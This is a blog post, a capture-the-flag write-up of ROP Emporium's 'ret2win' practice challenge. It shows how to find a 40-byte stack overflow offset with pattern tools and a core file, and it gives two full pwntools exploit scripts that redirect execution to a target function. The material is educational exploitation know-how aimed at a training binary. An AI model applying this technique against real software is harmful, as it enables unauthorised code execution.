---
layout: post
title: ropemporium - ret2win
date: 2024-12-23 08:00:00 +0300
description: # Add post description (optional)
img: ret2win-1.png # (optional)
fig-caption: # Add figcaption (optional)
tags: ctf
---

*The **ret2win** is the first challenge of **ropemporium.com**, a website made to learn Return Oriented Programming (ROP) through a variety of challenges.*

First of all, the challenge **ret2win** presents us with the following explanation
> *... the suspiciously named function `ret2win` is present and radare2 confirms that it will cat the flag back to us ...*

So there is a function named "**ret2win**", and we want to call that function.
First of all, checking the file data and security protections present:
- NX (Non executable stack)

![ret2win]({{site.baseurl}}/assets/img/ret2win-1.png)

```python
from pwn import *
elf = context.binary = ELF('./ret2win')
```

Then, checking *pwndbg*, we could get that the function exists and we could pick the address:

![ret2win]({{site.baseurl}}/assets/img/ret2win-2.png)

**Address of the function**
```
0x400756
```
*Is important to note that, since the program doesn't have any randomization (PIE, ASLR, etc.), we can get the function address without any worries.*

Then, we proceed sending a pattern string created by *msf-pattern_create* to send to the program, and as the image showed us the **SIGSEV** error, meaning a buffer overflow that corrupted the return address.   

![ret2win]({{site.baseurl}}/assets/img/ret2win-3.png)

```python
io.sendline("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
```

Then, we create a core file in order to comprehend where is the buffer overflowing, so we can check what is the exact amount of bytes needed to fill the **RIP** register.

![ret2win]({{site.baseurl}}/assets/img/ret2win-4.png)

```python
core = io.corefile
```

Then, in the "**Fault:**" field, we can get the fault address:
```
0x3562413462413362
```

Sending it to *msf-pattern_offset*, we get that the amount of bytes needed to fill the buffer is 40 bytes.

![ret2win]({{site.baseurl}}/assets/img/ret2win-5.png)

We can even check the exact pattern that was hit. 

![ret2win]({{site.baseurl}}/assets/img/ret2win-6.png)

![ret2win]({{site.baseurl}}/assets/img/ret2win-7.png)

Now, to forge the payload, we use the following principle:
```
(40 bytes to fill the buffer) + (ret2win address)
```

Which gave us the flag:

![ret2win]({{site.baseurl}}/assets/img/ret2win-8.png)

### Exploit

{% highlight python %}
from pwn import *

elf = context.binary = ELF('ret2win')

payload = b"A"*40+p64(elf.symbols.ret2win)

io = process(elf.path)
io.send(payload)
io.interactive()
{% endhighlight %}

## Automatic detection
In order to make an exploit to detect the buffer size, automatically fill the proper amount of bytes and set the RIP register to the desired function, we used the `fit()` function to pick the exact offset returned by `cyclic()` and craft a payload with the exact size. 

As said by the documentation
> *Dictionary usage permits directly using values derived from [`cyclic()`](https://docs.pwntools.com/en/stable/util/cyclic.html#pwnlib.util.cyclic.cyclic "pwnlib.util.cyclic.cyclic")*

So is possible to send a payload using
{% highlight python %}
io.sendline(cyclic(128))
{% endhighlight %}

Then craft the payload using
{% highlight python %}
payload = fit({pattern: elf.symbols.ret2win })
{% endhighlight %}

Which gave us a possibility to craft a final exploit.

### Final exploit
{% highlight python %}
from pwn import *

elf = context.binary = ELF('./ret2win')

io = process(elf.path)
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp

pattern = core.read(stack, 8)
payload = fit({pattern: elf.symbols.ret2win })

io = process(elf.path)
io.send(payload)
io.interactive()
{% endhighlight %}